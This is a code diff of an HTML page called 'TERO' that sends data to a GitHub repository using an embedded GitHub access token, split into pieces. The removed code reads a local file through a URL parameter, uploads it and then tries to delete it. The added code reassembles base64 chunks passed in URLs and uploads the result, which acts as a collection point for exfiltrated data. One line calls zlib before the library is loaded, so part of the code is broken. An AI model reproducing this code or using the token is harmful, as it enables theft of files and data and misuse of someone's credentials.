@@ -1,34 +1,45 @@
 <!DOCTYPE html>
 <html><head><meta charset="utf-8"><title>TERO</title>
-<style>body{background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial;}</style>
+<style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:100px;}</style>
 </head><body>
-<h1 style="color:#e74c3c">TERO</h1>
+<h1 style="color:#e74c3c;font-size:60px;">tero</h1>
 <div id="s">جاري الرفع...</div>
 
 <script>
-TOKEN = ''.join(["github_pat_11A3ZKARI0","Q8CbII0GvNSt_","hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra","276EGSZZQGRkTKn8W"])
-  const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
-const params = new URLSearchParams(location.search);
-const filePath = params.get('file');
+const TOKEN = ['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'].join('');
+const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
+let parts = [], total = 0;
 
-if (filePath) {
-  fetch('file:///' + decodeURIComponent(filePath))
-    .then(r => r.text())
-    .then(text => {
-      const fn = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
-      fetch(`${API}/${fn}`, {
-        method:'PUT',
-        headers:{'Authorization':`token ${TOKEN}`,'Content-Type':'application/json'},
-        body:JSON.stringify({message:"report", content:btoa(unescape(encodeURIComponent(text))), branch:"main"})
-      })
-      .then(() => {
-        document.getElementById('s').innerHTML = "تم الرفع!";
-        // حذف 
-        fetch('file:///' + decodeURIComponent(filePath), {method:'DELETE'}).catch(()=>{});
-        setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
-      });
+const urlParams = new URLSearchParams(location.search);
+const partIndex = urlParams.get('p');
+const data = urlParams.get('data');
+const status = document.getElementById('s');
+
+if (partIndex && data) {
+  parts[partIndex] = data;
+  if (partIndex == 0) total = parseInt(urlParams.get('total'));
+  
+  const received = parts.filter(Boolean).length;
+  status.innerHTML = `تلقي الجزء ${received} من ${total}`;
+  
+  if (received === total) {
+    const full = parts.join('');
+    const decoded = zlib.inflate(atob(full)); // تحتاج مكتبة zlib بسيطة أو حذف السطر ده واستخدم atob فقط
+    const content = atob(full);
+    const fn = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
+    
+    fetch(`${API}/${fn}`, {
+      method:'PUT',
+      headers:{'Authorization':`token ${TOKEN}`,'Content-Type':'application/json'},
+      body:JSON.stringify({message:"report", content:btoa(unescape(encodeURIComponent(content))), branch:"main"})
     })
-    .catch(() => document.getElementById('s').innerHTML = "فشل في القراءة");
+    .then(() => {
+      status.innerHTML = "<h1 style='color:#0f0'>تم الرفع بنجاح!</h1>";
+      setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
+    });
+  }
 }
 </script>
+<!-- مكتبة zlib لفك الضغط (اختياري لو عايز حجم أصغر) -->
+<script src="https://cdn.jsdelivr.net/npm/zlib@0.0.4/dist/zlib.min.js"></script>
 </body></html>
